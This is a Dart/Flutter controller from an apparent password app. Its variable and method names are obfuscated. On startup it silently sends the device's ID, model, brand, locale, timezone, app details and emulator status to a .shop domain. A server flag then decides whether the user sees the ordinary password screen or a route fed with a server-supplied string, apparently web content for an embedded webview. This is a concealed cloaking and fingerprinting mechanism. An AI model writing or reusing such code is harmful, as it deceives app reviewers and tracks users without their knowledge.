import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageControllerPass extends GetxController {

  var tnujkycpwv = RxBool(false);
  var fvysldcxn = RxBool(true);
  var kbgcthue = RxString("");
  var kaden = RxBool(false);
  var marquardt = RxBool(true);
  final bgxfwz = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    wszyc();
  }


  Future<void> wszyc() async {

    kaden.value = true;
    marquardt.value = true;
    fvysldcxn.value = false;

    bgxfwz.post("https://wake.dehor020.shop/djhtxuecnbwivkazlfqgory",data: await tmoepra()).then((value) {
      var ampjg = value.data["ampjg"] as String;
      var pduql = value.data["pduql"] as bool;
      if (pduql) {
        kbgcthue.value = ampjg;
        delmer();
      } else {
        mckenzie();
      }
    }).catchError((e) {
      fvysldcxn.value = true;
      marquardt.value = true;
      kaden.value = false;
    });
  }

  Future<Map<String, dynamic>> tmoepra() async {
    final DeviceInfoPlugin hijunv = DeviceInfoPlugin();
    PackageInfo qlpiourg_jpne = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var gvboiysc = Platform.localeName;
    var vlgmnw = currentTimeZone;

    var marwje = qlpiourg_jpne.packageName;
    var qeok = qlpiourg_jpne.version;
    var vkfdrbjm = qlpiourg_jpne.buildNumber;

    var nflzvjbs = qlpiourg_jpne.appName;
    var pftq = "";
    var coralieMorar = "";
    var yvedtf  = "";
    var rethaHamill = "";
    var briaStracke = "";
    var claraTillman = "";
    var qihdcvw = "";

    var bzcel = "";
    var jyws = false;

    if (GetPlatform.isAndroid) {
      bzcel = "android";
      var lxuobseak = await hijunv.androidInfo;

      qihdcvw = lxuobseak.brand;

      pftq  = lxuobseak.model;
      yvedtf = lxuobseak.id;

      jyws = lxuobseak.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      bzcel = "ios";
      var wragfn = await hijunv.iosInfo;
      qihdcvw = wragfn.name;
      pftq = wragfn.model;

      yvedtf = wragfn.identifierForVendor ?? "";
      jyws  = wragfn.isPhysicalDevice;
    }
    var res = {
      "claraTillman" : claraTillman,
      "nflzvjbs": nflzvjbs,
      "qeok": qeok,
      "marwje": marwje,
      "pftq": pftq,
      "coralieMorar" : coralieMorar,
      "vlgmnw": vlgmnw,
      "yvedtf": yvedtf,
      "vkfdrbjm": vkfdrbjm,
      "gvboiysc": gvboiysc,
      "bzcel": bzcel,
      "jyws": jyws,
      "rethaHamill" : rethaHamill,
      "briaStracke" : briaStracke,
      "qihdcvw": qihdcvw,

    };
    return res;
  }

  Future<void> mckenzie() async {
    Get.offAllNamed("/passwordTab");
  }

  Future<void> delmer() async {
    Get.offAllNamed("/passwordToo");
  }
}
